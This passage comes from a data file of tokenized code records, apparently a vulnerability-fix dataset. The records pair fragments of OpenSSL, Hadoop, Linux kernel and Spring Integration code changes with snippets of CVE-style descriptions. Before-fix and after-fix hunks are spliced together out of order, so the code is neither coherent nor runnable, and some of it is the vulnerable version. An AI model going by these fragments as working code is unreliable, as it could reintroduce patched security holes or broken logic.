"(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Error", "while", "opening", "Currency", "configuration", "file", "\"", "+", "currencyConfigFile", ",", "e", ")", ";", "}", "finally", "{", "try", "{", "if", "(", "is", "!", "=", "null", ")", "{", "is", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "e", ".", "printStackTrace", "(", ");"], "docstring_tokens": ["the", "API"]}
{"contents": ["empty"], "code_tokens": ["#", "define", "SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS", "423", "SSL3_RECORD", "*", "rr", ";", "DTLS1_BITMAP", "*", "bitmap", ";", "unsigned", "int", "is_next_epoch", ";", "int", "replayok", "=", "1", ";", "return", "1", ";", "/", "*", "Nothing", "to", "do", ".", "*", "/", "rr", "=", "RECORD_LAYER_get_rrec", "(", "&", "s", "-", ">", "rlayer", ")", ";", "bitmap", "=", "dtls1_get_bitmap", "(", "s", ",", "rr", ",", "&", "is_next_epoch", ")", ";", "if", "(", "bitmap", "=", "=", "NULL", ")", "{", "/", "*", "*", "Should", "not", "happen", ".", "This", "will", "only", "ever", "be", "NULL", "when", "the", "*", "current", "record", "is", "from", "a", "different", "epoch", ".", "But", "that", "cannot", "*", "be", "the", "case", "because", "we", "already", "checked", "the", "epoch", "above", "*", "/", "SSLerr", "(", "SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS", ",", "ERR_R_INTERNAL_ERROR", ")", ";", "return", "0", ";", "}", "#", "ifndef", "OPENSSL_NO_SCTP", "/", "*", "Only", "do", "replay", "check", "if", "no", "SCTP", "bio", "*", "/", "if", "(", "!", "BIO_dgram_is_sctp", "(", "SSL_get_rbio", "(", "s", ")", "))", "#", "endif", "{", "/", "*", "*", "Check", "whether", "this", "is", "a", "repeat", ",", "or", "aged", "record", ".", "We", "did", "this", "*", "check", "once", "already", "when", "we", "first", "received", "the", "record", "-", "but", "*", "we", "might", "have", "updated", "the", "window", "since", "then", "due", "to", "*", "records", "we", "subsequently", "processed", ".", "*", "/", "replayok", "=", "dtls1_record_replay_check", "(", "s", ",", "bitmap", ")", ";", "}", "if", "(", "!", "replayok", "|", "|", "!", "dtls1_process_record", "(", "s", ",", "bitmap", ")", ")", "{", "/", "*", "dump", "this", "record", "*", "/", "rr", "-", ">", "length", "=", "0", ";", "RECORD_LAYER_reset_packet_length", "(", "&", "s", "-", ">", "rlayer", ")", ";", "continue", ";", "}", "SSL3_RECORD_get_seq_num", "(", "s", "-", ">", "rlayer", ".", "rrec", ")", ")", "<", "0", ")", "return", "0", ";", "return", "1", ";", "int", "dtls1_process_record", "(", "SSL", "*", "s", ",", "DTLS1_BITMAP", "*", "bitmap", ")", ";", "int", "dtls1_process_record", "(", "SSL", "*", "s", ",", "DTLS1_BITMAP", "*", "bitmap", ")", "/", "*", "Mark", "receipt", "of", "record", ".", "*", "/", "dtls1_record_bitmap_update", "(", "s", ",", "bitmap", ")", ";", "if", "(", "!", "dtls1_process_buffered_records", "(", "s", ")", ")", "/", "*", "*", "TODO", ":", "Does", "it", "make", "sense", "to", "have", "replay", "protection", "in", "epoch", "0", "where", "*", "we", "have", "no", "integrity", "negotiated", "yet", "?", "*", "/", "if", "(", "!", "dtls1_process_record", "(", "s", ",", "bitmap", ")", ")", "{", "{", "ERR_FUNC", "(", "SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS", ")", ",", "\"", "dtls1_process_buffered_records", "\"", "},</s>return", "(", "1", ")", ";", "/", "*", "Nothing", "to", "do", ".", "*", "/", "if", "(", "!", "dtls1_process_record", "(", "s", ")", ")", "return", "(", "0", ")", ";", "SSL3_RECORD_get_seq_num", "(", "s", "-", ">", "rlayer", ".", "rrec", ")", ")", "<", "0", ")", "return", "-", "1", ";", "return", "(", "1", ")", ";", "int", "dtls1_process_record", "(", "SSL", "*", "s", ")", ";", "int", "dtls1_process_record", "(", "SSL", "*", "s", ")", "if", "(", "dtls1_process_buffered_records", "(", "s", ")", "<", "0", ")", "/", "*", "Mark", "receipt", "of", "record", ".", "*", "/", "dtls1_record_bitmap_update", "(", "s", ",", "bitmap", ")", ";", "if", "(", "!", "dtls1_process_record", "(", "s", ")", ")", "{", "dtls1_record_bitmap_update", "(", "s", ",", "bitmap", ")", ";", "/", "*", "Mark", "receipt", "of", "record", ".", "*", "/"], "docstring_tokens": ["sending", "a", "specially", "crafted", "sequence", "number"]}
{"contents": ["empty"], "code_tokens": ["private", "byte", "[", "]", "encryptedSpillKey", "=", "new", "byte", "[", "]", "{", "0", "}", ";", "public", "void", "setEncryptedSpillKey", "(", "byte", "[", "]", "encryptedSpillKey", ")", "{", "if", "(", "encryptedSpillKey", "!", "=", "null", ")", "{", "this", ".", "encryptedSpillKey", "=", "encryptedSpillKey", ";", "}", "}", "/", "/", "Check", "and", "handle", "Encrypted", "spill", "key", "task", ".", "setEncryptedSpillKey", "(", "encryptedSpillKey", ")", ";", "YarnChild", ".", "setEncryptedSpillKeyIfRequired", "(", "task", ")", ";", ".", "newSetFromMap", "(", "new", "ConcurrentHashMap", "<", "WrappedJvmID", ",", "Boolean", ">", "()", ");", "private", "byte", "[", "]", "encryptedSpillKey", ";", "this", "(", "context", ",", "jobTokenSecretManager", ",", "rmHeartbeatHandler", ",", "preemptionPolicy", ",", "null", ")", ";", "}", "public", "TaskAttemptListenerImpl", "(", "AppContext", "context", ",", "JobTokenSecretManager", "jobTokenSecretManager", ",", "RMHeartbeatHandler", "rmHeartbeatHandler", ",", "AMPreemptionPolicy", "preemptionPolicy", ",", "byte", "[", "]", "secretShuffleKey", ")", "{", "this", ".", "encryptedSpillKey", "=", "secretShuffleKey", ";", "task", ".", "setEncryptedSpillKey", "(", "encryptedSpillKey", ")", ";", "setEncryptedSpillKeyIfRequired", "(", "taskFinal", ")", ";", "/", "**", "*", "Utility", "method", "to", "check", "if", "the", "Encrypted", "Spill", "Key", "needs", "to", "be", "set", "into", "the", "*", "user", "credentials", "of", "the", "user", "running", "the", "Map", "/", "Reduce", "Task", "*", "@", "param", "task", "The", "Map", "/", "Reduce", "task", "to", "set", "the", "Encrypted", "Spill", "information", "in", "*", "@", "throws", "Exception", "*", "/", "public", "static", "void", "setEncryptedSpillKeyIfRequired", "(", "Task", "task", ")", "throws", "Exception", "{", "if", "(", "(", "task", "!", "=", "null", ")", "&", "&", "(", "task", ".", "getEncryptedSpillKey", "(", ")", "!", "=", "null", ")", "&", "&", "(", "task", ".", "getEncryptedSpillKey", "(", ").", "length", ">", "1", ")", ")", "{", "Credentials", "creds", "=", "UserGroupInformation", ".", "getCurrentUser", "(", ").", "getCredentials", "(", ");", "TokenCache", ".", "setEncryptedSpillKey", "(", "task", ".", "getEncryptedSpillKey", "(", "),", "creds", ")", ";", "UserGroupInformation", ".", "getCurrentUser", "(", ").", "addCredentials", "(", "creds", ")", ";", "}", "}", "import", "java", ".", "security", ".", "NoSuchAlgorithmException", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "mapreduce", ".", "CryptoUtils", ";", "import", "javax", ".", "crypto", ".", "KeyGenerator", ";", "public", "static", "final", "String", "INTERMEDIATE_DATA_ENCRYPTION_ALGO", "=", "\"", "HmacSHA1", "\"", ";", "private", "byte", "[", "]", "encryptedSpillKey", ";", "if", "(", "CryptoUtils", ".", "isEncryptedSpillEnabled", "(", "conf", ")", ")", "{", "int", "keyLen", "=", "conf", ".", "getInt", "(", "MRJobConfig", ".", "MR_ENCRYPTED_INTERMEDIATE_DATA_KEY_SIZE_BITS", ",", "MRJobConfig", ".", "DEFAULT_MR_ENCRYPTED_INTERMEDIATE_DATA_KEY_SIZE_BITS", ")", ";", "KeyGenerator", "keyGen", "=", "KeyGenerator", ".", "getInstance", "(", "INTERMEDIATE_DATA_ENCRYPTION_ALGO", ")", ";", "keyGen", ".", "init", "(", "keyLen", ")", ";", "encryptedSpillKey", "=", "keyGen", ".", "generateKey", "(", ").", "getEncoded", "(", ");", "}", "else", "{", "encryptedSpillKey", "=", "new", "byte", "[", "]", "{", "0", "}", ";", "}", "}", "catch", "(", "NoSuchAlgorithmException", "e", ")", "{", "throw", "new", "YarnRuntimeException", "(", "e", ")", ";", "getRMHeartbeatHandler", "(", "),", "preemptionPolicy", ",", "encryptedSpillKey", ")", ";", "(", "(", "LocalContainerLauncher", ")", "this", ".", "containerLauncher", ")", ".", "setEncryptedSpillKey", "(", "encryptedSpillKey", ")", ";", "private", "byte", "[", "]", "encryptedSpillKey", "=", "new", "byte", "[", "]", "{", "0", "}", ";", "/", "/", "Key", "Used", "to", "encrypt", "/", "/", "intermediate", "spills", "/", "**", "*", "Get", "Encrypted", "spill", "key", "*", "@", "return", "encrypted", "spill", "key", "*", "/", "public", "byte", "[", "]", "getEncryptedSpillKey", "(", ")", "{", "return", "encryptedSpillKey", ";", "}", "/", "**", "*", "Set", "Encrypted", "spill", "key", "*", "@", "param", "encryptedSpillKey", "key", "*", "/", "public", "void", "setEncryptedSpillKey", "(", "byte", "[", "]", "encryptedSpillKey", ")", "{", "if", "(", "encryptedSpillKey", "!", "=", "null", ")", "{", "this", ".", "encryptedSpillKey", "=", "encryptedSpillKey", ";", "}", "}", "out", ".", "writeInt", "(", "encryptedSpillKey", ".", "length", ")", ";", "out", ".", "write", "(", "encryptedSpillKey", ")", ";", "int", "len", "=", "in", ".", "readInt", "(", ");", "encryptedSpillKey", "=", "new", "byte", "[", "len", "]", ";", "in", ".", "readFully", "(", "encryptedSpillKey", ")", ";", "public", "static", "boolean", "isEncryptedSpillEnabled", "(", "Configuration", "conf", ")", "{", "if", "(", "isEncryptedSpillEnabled", "(", "conf", ")", ")", "{", "return", "isEncryptedSpillEnabled", "(", "conf", ")", "?", "CryptoCodec", ".", "getInstance", "(", "conf", ")", "return", "TokenCache", ".", "getEncryptedSpillKey", "(", "UserGroupInformation", ".", "getCurrentUser", "(", ")", ".", "getCredentials", "(", "))", ";", "if", "(", "isEncryptedSpillEnabled", "(", "conf", ")", ")", "{", "if", "(", "isEncryptedSpillEnabled", "(", "conf", ")", ")", "{", "if", "(", "isEncryptedSpillEnabled", "(", "conf", ")", ")", "{", "keyGen", ".", "init", "(", "SHUFFLE_KEY_LENGTH", ")", ";", "if", "(", "CryptoUtils", ".", "isEncryptedSpillEnabled", "(", "conf", ")", ")", "{", "conf", ".", "setInt", "(", "MRJobConfig", ".", "MR_AM_MAX_ATTEMPTS", ",", "1", ")", ";", "LOG", ".", "warn", "(", "\"", "Max", "job", "attempts", "set", "to", "1", "since", "encrypted", "intermediate", "\"", "\"", "data", "spill", "is", "enabled", "\"", ");", "}", "private", "static", "final", "Text", "ENC_SPILL_KEY", "=", "new", "Text", "(", "\"", "MapReduceEncryptedSpillKey", "\"", ");", "@", "InterfaceAudience", ".", "Private", "public", "static", "void", "setEncryptedSpillKey", "(", "byte", "[", "]", "key", ",", "Credentials", "credentials", ")", "{", "credentials", ".", "addSecretKey", "(", "ENC_SPILL_KEY", ",", "key", ")", ";", "}", "@", "InterfaceAudience", ".", "Private", "public", "static", "byte", "[", "]", "getEncryptedSpillKey", "(", "Credentials", "credentials", ")", "{", "return", "getSecretKey", "(", "credentials", ",", "ENC_SPILL_KEY", ")", ";", "}", "compressedLength", "-", "=", "CryptoUtils", ".", "cryptoPadding", "(", "job", ")", ";", "decompressedLength", "-", "=", "CryptoUtils", ".", "cryptoPadding", "(", "job", ")", ";", "inStream", ".", "seek", "(", "ir", ".", "startOffset", "+", "CryptoUtils", ".", "cryptoPadding", "(", "job", ")", ");", "Encrypted", "Intermediate", "Data", "Spill", "files", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "This", "capability", "allows", "encryption", "of", "the", "intermediate", "files", "generated", "during", "the", "merge", "and", "shuffle", "phases", ".", "It", "can", "be", "enabled", "by", "setting", "the", "`", "mapreduce", ".", "job", ".", "encrypted", "-", "intermediate", "-", "data", "`", "job", "property", "to", "`", "true", "`", ".", "*", "*", "NOTE", ":", "**", "Currently", ",", "enabling", "encrypted", "intermediate", "data", "spills", "would", "restrict", "the", "number", "of", "attempts", "of", "the", "job", "to", "1", ".", "TokenCache", ".", "setEncryptedSpillKey", "(", "new", "byte", "[", "16", "]", ",", "credentials", ")", ";", "doEncryptionTest", "(", "3", ",", "1", ",", "2", ",", "false", ")", ";", "}", "@", "Test", "public", "void", "testUberMode", "(", ")", "throws", "Exception", "{", "doEncryptionTest", "(", "3", ",", "1", ",", "2", ",", "true", ")", ";", "doEncryptionTest", "(", "8", ",", "1", ",", "2", ",", "false", ")", ";", "doEncryptionTest", "(", "2", ",", "4", ",", "2", ",", "false", ")", ";", "public", "void", "doEncryptionTest", "(", "int", "numMappers", ",", "int", "numReducers", ",", "int", "numNodes", ",", "boolean", "isUber", ")", "throws", "Exception", "{", "doEncryptionTest", "(", "numMappers", ",", "numReducers", ",", "numNodes", ",", "1000", ",", "isUber", ")", ";", "public", "void", "doEncryptionTest", "(", "int", "numMappers", ",", "int", "numReducers", ",", "int", "numNodes", ",", "int", "numLines", ",", "boolean", "isUber", ")", "throws", "Exception", "{", "runMergeTest", "(", "new", "JobConf", "(", "mrCluster", ".", "getConfig", "(", "))", ",", "fileSystem", ",", "numMappers", ",", "numReducers", ",", "numLines", ",", "isUber", ")", ";", "private", "void", "runMergeTest", "(", "JobConf", "job", ",", "FileSystem", "fileSystem", ",", "int", "numMappers", ",", "int", "numReducers", ",", "int", "numLines", ",", "boolean", "isUber", ")", "throws", "Exception", "{", "if", "(", "isUber", ")", "{", "job", ".", "setBoolean", "(", "\"", "mapreduce", ".", "job", ".", "ubertask", ".", "enable", "\"", ",", "true", ")", ";", "}", "if", "(", "taskStatus", "!", "=", "null", ")", "{", "buf", ".", "append", "(", "\"", "making", "progress", "to", "\"", ");", "buf", ".", "append", "(", "taskStatus", ".", "getProgress", "(", "))", ";", "String", "state", "=", "taskStatus", ".", "getStateString", "(", ");", "if", "(", "state", "!", "=", "null", ")", "{", "buf", ".", "append", "(", "\"", "and", "state", "of", "\"", ");", "buf", ".", "append", "(", "state", ")", ";", "}</s>.", "newSetFromMap", "(", "new", "ConcurrentHashMap", "<", "WrappedJvmID", ",", "Boolean", ">", "()", ");", "getRMHeartbeatHandler", "(", "),", "preemptionPolicy", ")", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "mapreduce", ".", "MRJobConfig", ";", "public", "static", "boolean", "isShuffleEncrypted", "(", "Configuration", "conf", ")", "{", "if", "(", "isShuffleEncrypted", "(", "conf", ")", ")", "{", "return", "isShuffleEncrypted", "(", "conf", ")", "?", "CryptoCodec", ".", "getInstance", "(", "conf", ")", "return", "TokenCache", ".", "getShuffleSecretKey", "(", "UserGroupInformation", ".", "getCurrentUser", "(", ")", ".", "getCredentials", "(", "))", ";", "if", "(", "isShuffleEncrypted", "(", "conf", ")", ")", "{", "if", "(", "isShuffleEncrypted", "(", "conf", ")", ")", "{", "if", "(", "isShuffleEncrypted", "(", "conf", ")", ")", "{", "import", "java", ".", "io", ".", "FileNotFoundException", ";", "import", "java", ".", "net", ".", "UnknownHostException", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "fs", ".", "FileUtil", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "mapreduce", ".", "filecache", ".", "ClientDistributedCacheManager", ";", "int", "keyLen", "=", "CryptoUtils", ".", "isShuffleEncrypted", "(", "conf", ")", "?", "conf", ".", "getInt", "(", "MRJobConfig", ".", "MR_ENCRYPTED_INTERMEDIATE_DATA_KEY_SIZE_BITS", ",", "MRJobConfig", ".", "DEFAULT_MR_ENCRYPTED_INTERMEDIATE_DATA_KEY_SIZE_BITS", ")", ":", "SHUFFLE_KEY_LENGTH", ";", "keyGen", ".", "init", "(", "keyLen", ")", ";", "inStream", ".", "seek", "(", "ir", ".", "startOffset", ")", ";", "TokenCache", ".", "setShuffleSecretKey", "(", "new", "byte", "[", "16", "]", ",", "credentials", ")", ";", "doEncryptionTest", "(", "3", ",", "1", ",", "2", ")", ";", "doEncryptionTest", "(", "8", ",", "1", ",", "2", ")", ";", "doEncryptionTest", "(", "2", ",", "4", ",", "2", ")", ";", "public", "void", "doEncryptionTest", "(", "int", "numMappers", ",", "int", "numReducers", ",", "int", "numNodes", ")", "throws", "Exception", "{", "doEncryptionTest", "(", "numMappers", ",", "numReducers", ",", "numNodes", ",", "1000", ")", ";", "public", "void", "doEncryptionTest", "(", "int", "numMappers", ",", "int", "numReducers", ",", "int", "numNodes", ",", "int", "numLines", ")", "throws", "Exception", "{", "runMergeTest", "(", "new", "JobConf", "(", "mrCluster", ".", "getConfig", "(", "))", ",", "fileSystem", ",", "numMappers", ",", "numReducers", ",", "numLines", ")", ";", "private", "void", "runMergeTest", "(", "JobConf", "job", ",", "FileSystem", "fileSystem", ",", "int", "numMappers", ",", "int", "numReducers", ",", "int", "numLines", ")", "throws", "Exception", "{", "buf", ".", "append", "(", "\"", "making", "progress", "to", "\"", ");", "buf", ".", "append", "(", "taskStatus", ".", "getProgress", "(", "))", ";", "String", "state", "=", "taskStatus", ".", "getStateString", "(", ");", "if", "(", "state", "!", "=", "null", ")", "{", "buf", ".", "append", "(", "\"", "and", "state", "of", "\"", ");", "buf", ".", "append", "(", "state", ")", ";"], "docstring_tokens": ["running", "MapReduce", "jobs"]}
{"contents": ["empty"], "code_tokens": ["int", "next_pidmap", "(", "struct", "pid_namespace", "*", "pid_ns", ",", "unsigned", "int", "last", ")", ";", "int", "next_pidmap", "(", "struct", "pid_namespace", "*", "pid_ns", ",", "unsigned", "int", "last", ")", "if", "(", "last", ">", "=", "PID_MAX_LIMIT", ")", "return", "-", "1", ";</s>int", "next_pidmap", "(", "struct", "pid_namespace", "*", "pid_ns", ",", "int", "last", ")", ";", "int", "next_pidmap", "(", "struct", "pid_namespace", "*", "pid_ns", ",", "int", "last", ")"], "docstring_tokens": ["via", "a", "crafted", "(1", ")", "getdents", "or", "(2", ")", "readdir", "system", "call", "."]}
{"contents": ["empty"], "code_tokens": ["springWsVersion", "=", "'", "3", ".", "0", ".", "5", ".", "RELEASE", "'", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "this", "(", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", "))", ";", "Assert", ".", "notNull", "(", "documentBuilderFactory", ",", "\"", "'", "documentBuilderFactory", "'", "must", "not", "be", "null", ".", "\")", ";", "Node", "node", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "ManagedMap", "<", "String", ",", "Object", ">", "headers", "=", "new", "ManagedMap", "<", ">(", ");", "processHeaders", "(", "element", ",", "headers", ",", "parserContext", ")", ";", "String", "converter", "=", "element", ".", "getAttribute", "(", "\"", "converter", "\"", ");", "BeanDefinitionBuilder", ".", "genericBeanDefinition", "(", "XPathExpressionEvaluatingHeaderValueMessageProcessor", ".", "class", ")", ";", "if", "(", "isExpressionString", "=", "=", "isExpressionRef", ")", "{", "\"", "Exactly", "one", "of", "the", "'", "xpath", "-", "expression", "'", "\"", "\"", "or", "'", "xpath", "-", "expression", "-", "ref", "'", "attributes", "is", "required", ".", "\",", "source", ")", ";", "if", "(", "StringUtils", ".", "hasText", "(", "converter", ")", ")", "{", "builder", ".", "addConstructorArgReference", "(", "converter", ")", ";", "}", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "*", "@", "author", "Artem", "Bilan", "public", "DomResultFactory", "(", ")", "{", "this", "(", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", "))", ";", "this", ".", "documentBuilderFactory", ".", "setNamespaceAware", "(", "true", ")", ";", "public", "DomResultFactory", "(", "DocumentBuilderFactory", "documentBuilderFactory", ")", "{", "Assert", ".", "notNull", "(", "documentBuilderFactory", ",", "\"", "'", "documentBuilderFactory", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "documentBuilderFactory", "=", "documentBuilderFactory", ";", "*", "@", "author", "Artem", "Bilan", "*", "private", "final", "Log", "logger", "=", "LogFactory", ".", "getLog", "(", "getClass", "(", "))", ";", "private", "boolean", "throwExceptionOnRejection", ";", "private", "XmlPayloadConverter", "converter", "=", "new", "DefaultXmlPayloadConverter", "(", ");", "*", "@", "param", "schemaType", "The", "schema", "type", ".", "public", "XmlValidatingMessageSelector", "(", "Resource", "schema", ",", "SchemaType", "schemaType", ")", "throws", "IOException", "{", "this", "(", "XmlValidatorFactory", ".", "createValidator", "(", "schema", ",", "schemaType", "=", "=", "null", "?", "SchemaType", ".", "XML_SCHEMA", ".", "getUrl", "(", ")", ":", "schemaType", ".", "getUrl", "(", "))", ");", "}", "public", "XmlValidatingMessageSelector", "(", "XmlValidator", "xmlValidator", ")", "{", "Assert", ".", "notNull", "(", "xmlValidator", ",", "\"", "XmlValidator", "must", "not", "be", "null", "\"", ");", "this", ".", "xmlValidator", "=", "xmlValidator", ";", "this", "(", "schema", ",", "StringUtils", ".", "isEmpty", "(", "schemaType", ")", "?", "null", ":", "SchemaType", ".", "valueOf", "(", "schemaType", ".", "toUpperCase", "(", ").", "replaceFirst", "(", "\"-", "\",", "\"", "_", "\"", "))", ");", "new", "AggregatedXmlMessageValidationException", "(", "Arrays", ".", "asList", "(", "validationExceptions", ")", "))", ";", "}", "else", "if", "(", "this", ".", "logger", ".", "isInfoEnabled", "(", "))", "{", "this", ".", "logger", ".", "info", "(", "\"", "Message", "was", "rejected", "due", "to", "XML", "Validation", "errors", "\"", ",", "new", "AggregatedXmlMessageValidationException", "(", "Arrays", ".", "asList", "(", "validationExceptions", ")", "))", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "*", "@", "author", "Artem", "Bilan", "this", "(", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", "))", ";", "this", ".", "documentBuilderFactory", ".", "setNamespaceAware", "(", "true", ")", ";", "Assert", ".", "notNull", "(", "documentBuilderFactory", ",", "\"", "'", "documentBuilderFactory", "'", "must", "not", "be", "null", ".", "\")", ";", "Document", "document", "=", "getNewDocumentBuilder", "(", ").", "parse", "(", "file", ")", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "*", "@", "author", "Artem", "Bilan", "this", "(", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "Assert", ".", "notNull", "(", "transformerFactory", ",", "\"", "'", "transformerFactory", "'", "must", "not", "be", "null", ".", "\")", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "private", "final", "TransformerFactory", "transformerFactory", ";", "private", "boolean", "createDocuments", ";", "private", "DocumentBuilderFactory", "documentBuilderFactory", ";", "private", "XmlPayloadConverter", "xmlPayloadConverter", "=", "new", "DefaultXmlPayloadConverter", "(", ");", "private", "Properties", "outputProperties", ";", "private", "boolean", "iterator", "=", "true", ";", "this", "(", "expression", ",", "new", "HashMap", "<", ">(", "))", ";", "}", "/", "**", "*", "Construct", "an", "instance", "based", "on", "the", "provided", "xpath", "expression", "and", "*", "{", "@", "link", "TransformerFactory", "}", ".", "*", "@", "param", "expression", "the", "xpath", "expression", "for", "splitting", ".", "*", "@", "param", "transformerFactory", "the", "{", "@", "link", "TransformerFactory", "}", "*", "for", "parsing", "and", "building", "documents", ".", "*", "@", "since", "4", ".", "3", ".", "19", "*", "/", "public", "XPathMessageSplitter", "(", "String", "expression", ",", "TransformerFactory", "transformerFactory", ")", "{", "this", "(", "expression", ",", "new", "HashMap", "<", ">(", "),", "transformerFactory", ")", ";", "this", "(", "expression", ",", "namespaces", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "}", "/", "**", "*", "Construct", "an", "instance", "based", "on", "the", "provided", "xpath", "expression", ",", "namespaces", "and", "*", "{", "@", "link", "TransformerFactory", "}", ".", "*", "@", "param", "expression", "the", "xpath", "expression", "for", "splitting", ".", "*", "@", "param", "namespaces", "the", "XML", "namespace", "for", "parsing", ".", "*", "@", "param", "transformerFactory", "the", "{", "@", "link", "TransformerFactory", "}", "*", "for", "parsing", "and", "building", "documents", ".", "*", "@", "since", "4", ".", "3", ".", "19", "*", "/", "public", "XPathMessageSplitter", "(", "String", "expression", ",", "Map", "<", "String", ",", "String", ">", "namespaces", ",", "TransformerFactory", "transformerFactory", ")", "{", "this", "(", "XPathExpressionFactory", ".", "createXPathExpression", "(", "expression", ",", "namespaces", ")", ",", "transformerFactory", ")", ";", "this", "(", "xpathExpression", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "}", "/", "**", "*", "Construct", "an", "instance", "based", "on", "the", "provided", "xpath", "expression", "and", "*", "{", "@", "link", "TransformerFactory", "}", ".", "*", "@", "param", "xpathExpression", "the", "xpath", "expression", "for", "splitting", ".", "*", "@", "param", "transformerFactory", "the", "{", "@", "link", "TransformerFactory", "}", "*", "for", "parsing", "and", "building", "documents", ".", "*", "@", "since", "4", ".", "3", ".", "19", "*", "/", "public", "XPathMessageSplitter", "(", "XPathExpression", "xpathExpression", ",", "TransformerFactory", "transformerFactory", ")", "{", "Assert", ".", "notNull", "(", "transformerFactory", ",", "\"", "'", "transformerFactory", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "transformerFactory", "=", "transformerFactory", ";", "this", ".", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "List", "<", "String", ">", "splitStrings", "=", "new", "ArrayList", "<", ">(", "items", ".", "size", "(", "))", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "*", "@", "author", "Artem", "Bilan", "this", "(", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", "))", ";", "public", "ResultToDocumentTransformer", "(", "DocumentBuilderFactory", "documentBuilderFactory", ")", "{", "Assert", ".", "notNull", "(", "documentBuilderFactory", ",", "\"", "'", "documentBuilderFactory", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "documentBuilderFactory", "=", "documentBuilderFactory", ";", "}", "Document", "document", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "*", "@", "author", "Artem", "Bilan", "private", "Properties", "outputProperties", ";", "this", ".", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "}", "/", "**", "*", "Construct", "an", "instance", "based", "on", "the", "provided", "{", "@", "link", "TransformerFactory", "}", ".", "*", "@", "param", "transformerFactory", "the", "{", "@", "link", "TransformerFactory", "}", "to", "use", ".", "*", "@", "since", "4", ".", "3", ".", "19", "*", "/", "public", "ResultToStringTransformer", "(", "TransformerFactory", "transformerFactory", ")", "{", "Assert", ".", "notNull", "(", "transformerFactory", ",", "\"", "'", "transformerFactory", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "transformerFactory", "=", "transformerFactory", ";", "returnString", "=", "result", ".", "toString", "(", ");", "getNewTransformer", "(", ").", "transform", "(", "Transformer", "transformer", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "FileSystemResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "VfsResource", ";", "import", "org", ".", "springframework", ".", "web", ".", "context", ".", "support", ".", "ServletContextResource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "private", "final", "Resource", "xslResource", ";", "private", "Templates", "templates", ";", "private", "SourceFactory", "sourceFactory", "=", "new", "DomSourceFactory", "(", ");", "private", "boolean", "resultFactoryExplicitlySet", ";", "private", "boolean", "alwaysUseSourceFactory", "=", "false", ";", "private", "boolean", "alwaysUseResultFactory", "=", "false", ";", "private", "String", "[", "]", "xsltParamHeaders", ";", "public", "XsltPayloadTransformer", "(", "Templates", "templates", ",", "ResultTransformer", "resultTransformer", ")", "{", "Assert", ".", "notNull", "(", "templates", ",", "\"", "'", "templates", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "templates", "=", "templates", ";", "this", ".", "resultTransformer", "=", "resultTransformer", ";", "this", ".", "xslResource", "=", "null", ";", "}", "this", "(", "xslResource", ",", "null", ",", "transformerFactoryClassName", ")", ";", "public", "XsltPayloadTransformer", "(", "Resource", "xslResource", ",", "ResultTransformer", "resultTransformer", ",", "String", "transformerFactoryClassName", ")", "{", "Assert", ".", "isTrue", "(", "xslResource", "instanceof", "ClassPathResource", "|", "|", "xslResource", "instanceof", "FileSystemResource", "|", "|", "xslResource", "instanceof", "ServletContextResource", "|", "|", "xslResource", "instanceof", "VfsResource", ",", "\"", "Only", 